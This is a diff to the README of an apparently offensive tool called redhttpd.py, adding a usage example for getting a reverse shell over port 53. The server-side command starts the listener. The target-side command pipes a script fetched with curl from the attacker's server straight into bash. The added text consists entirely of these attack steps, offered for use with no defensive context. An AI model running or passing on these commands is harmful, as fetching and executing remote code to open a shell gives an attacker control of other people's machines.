@@ -52,4 +52,18 @@ optional arguments:
 ```
 
 # Examples
-TODO
+
+## Simple example using YOLO mode to get a reverse shell through port 53
+
+Server-side
+
+```
+python redhttpd.py -p 53 -y --LHOST=<REDHTTPD_ADDRESS>
+```
+
+Target-side (using bash)
+
+```
+curl -s <REDHTTPD_ADDRESS>/sh.txt | bash
+```
+
